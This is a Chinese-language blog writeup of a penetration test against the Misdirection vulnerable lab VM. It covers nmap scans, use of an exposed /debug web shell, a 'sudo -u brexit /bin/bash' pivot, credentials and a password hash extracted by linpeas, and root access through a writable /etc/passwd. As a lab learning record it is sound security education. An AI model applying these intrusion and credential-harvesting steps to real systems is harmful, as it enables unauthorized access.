---
title: Misdirection # 从 Astro 的 title 转换
date: 2025/04/09 09:00:00 # 从 Astro 的 published 转换，并添加一个默认时间 (例如，早上9点)，使用您指定的日期格式
# updated: YYYY/MM/DD HH:MM:SS # 可选，如果文章有更新日期，可以添加此字段
description: Misdirection靶机渗透测试复盘 # 从 Astro 的 description 转换
cover: /images/Misdriction_cover.png # 从 Astro 的 image 转换，注意路径前添加 '/' 表示根目录
tags: # 从 Astro 的 tags 转换
  - CTF
  - 渗透测试
  - Linux提权
categories: # 从 Astro 的 category 转换，Hexo 常用 categories (复数)
  - Writeup
# 以下是 Redefine 主题特有或常用的可选字段，根据您的需求选择性添加
# author: 您的名字 # 可选，如需显示文章作者
# avatar: /img/your-avatar.png # 可选，如需显示作者头像
# password: your_secret_password # 文章加密，根据需要添加
# message: 本文已加密，请输入密码。 # 加密提示信息
# encrypt_abstract: 加密文章摘要。
# sticky: 1 # 置顶文章，数值越大优先级越高
# comment: true # 是否开启评论，默认开启
# toc: true # 是否显示目录，默认开启
# math: false # 是否开启数学公式，默认关闭
# mermaid: false # 是否开启 Mermaid 图表，默认关闭
---
## 靶机发现端口信息枚举

### 端口探测

```
# Nmap 7.94SVN scan initiated Wed Apr  9 02:38:49 2025 as: nmap -sT -p- --min-rate=10000 -oA ./nmapscan/ports 192.168.5.137
Nmap scan report for misdirection.lan (192.168.5.137)
Host is up (0.0016s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:4A:30:F8 (VMware)

```
### 服务探测
```
# Nmap 7.94SVN scan initiated Wed Apr  9 02:40:43 2025 as: nmap --script=vuln -p22,80,3306,8080 -sC -sV -oA ./nmapscan/vuln 192.168.5.137
Nmap scan report for misdirection.lan (192.168.5.137)
Host is up (0.00023s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| ………………
|_    http://misdirection.lan:8080/manual/?C=N%3BO%3DA%27%20OR%20sqlspider
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
MAC Address: 00:0C:29:4A:30:F8 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  9 02:50:40 2025 -- 1 IP address (1 host up) scanned in 596.69 seconds
```

很抽象的东西nmap报了一堆漏洞结果没有能用的

## web服务探测

### 先看80端口（实际上应该先看8080的）

80上来就是个静态界面，有个登录框，但是不知道为什么我打开80界面特别卡

![image-20250409164730699](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250409164730699.png)

啥都打不开，看网上别人写的wp也是有遇到这个问题的

dirsearch扫了一下目录没发现什么有意思的只有一个/admin但是打开显示“出于安全原因禁止访问”

### 再看8080端口

打开是阿帕奇的默认界面

dirsearch找到了好东西/debug界面是个shell，直接打个反弹来拿到www-data权限

![image-20250409165301663](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250409165301663.png)



## 漏洞利用

![image-20250409165353115](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250409165353115.png)

这个地方首先就是手动枚举了一下能想到的东西，计划任务，sudo -l之类的还顺带找了一下find / -perm -u=s -type f 2>/dev/null

都没有*”发现“*其实并非，我不知道sudo -u 用户名 命令可以以该用户权限来运行东西，成功错过了用户立足点的发现。

## 立足点获取

```bash
sudo -u brexit /bin/bash
```

获取到user立足点

![image-20250409165846719](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250409165846719.png)

```bash
brexit@misdirection:/var/www/html/debug$ cat /home/brexit/user.txt
cat /home/brexit/user.txt
404b9193154be7fbbc56d7534cb26339
```

## 机器信息收集

### 爆破两个密码无果

获取到这个之后又没思路了因为之前在www-data权限下面我已经翻了很多东西了。所以传了个linpeas*（实际上www-data就传上去了）*

linpeas发现了两个密码

```bash
 -> Extracting tables from /home/brexit/web2py/applications/init/databases/storage.sqlite (limit 20)
  --> Found interesting column names in auth_user (output limit 10)                                    
CREATE TABLE "auth_user"(                                                                                
    "id" INTEGER PRIMARY KEY AUTOINCREMENT,
    "first_name" CHAR(128),                
    "last_name" CHAR(128), 
    "email" CHAR(512),    
    "password" CHAR(512),
    "registration_key" CHAR(512),
    "reset_password_key" CHAR(512),
    "registration_id" CHAR(512),   
    "is_manager" CHAR(1)       
)
1, brexit, brexit, brexit@brexit.com, pbkdf2(1000,20,sha512)$b84155cf478dcabe$0b88e35739f7ec70bd553e759d00eb441b12bbfb, , , , T

```
这个直接发到hashcat来爆破用rockyou字典没任何结果，如果是brexit这个权限的话实际上爆破的意义不是很大，可惜我当时是www-data我还指望能通过这个提权
```bash
╔══════════╣ Analyzing Wordpress Files (limit 70)                                                                                                                                                                  
-rwxr-xr-x 1 www-data www-data 2889 Jun  1  2019 /var/www/html/wordpress/wp-config.php                                                                                                                             
define( 'DB_NAME', 'wp_myblog' );                                                                                                                                                                                  
define( 'DB_USER', 'blog' );                                                                                                                                                                                       
define( 'DB_PASSWORD', 'abcdefghijklmnopqrstuv' );                                                                                                                                                                 
define( 'DB_HOST', 'localhost' );    
```

## 权限提升

### /etc/passwd可写

我当时不知道这个可以提权，甚至没有注意到linpeas的高亮

![image-20250409170644696](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250409170644696.png)

## ROOT

```bash
root@misdirection:/home/brexit# id
id
uid=0(root) gid=0(root) groups=0(root)
root@misdirection:/home/brexit# cat /root/root.txt
cat /root/root.txt
0d2c6222bfdd3701e0fa12a9a9dc9c8c
root@misdirection:/home/brexit# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:4a:30:f8 brd ff:ff:ff:ff:ff:ff
    inet 192.168.55.129/24 brd 192.168.55.255 scope global dynamic ens33
       valid_lft 1473sec preferred_lft 1473sec
    inet6 fe80::20c:29ff:fe4a:30f8/64 scope link 
       valid_lft forever preferred_lft forever
root@misdirection:/home/brexit# uname
uname
Linux
root@misdirection:/home/brexit# uname -a
uname -a
Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

```

## 总结复盘

一台非常简单的机子被我给搞得很抽象。就像它的名字所写的一样全部都是misdirection。

缺点还是脚本使用不清楚、提权这块子还是有点知之甚少了，虽然看过红笔师傅的Linux提权精讲了但还是啥都不会

在这块推荐一下这个提权精讲视频看下来思路会顺上不少，不至于拿下立足点后不知道应该干些什么

[提权精讲](https://www.bilibili.com/video/BV1DV4y1U7bT/)
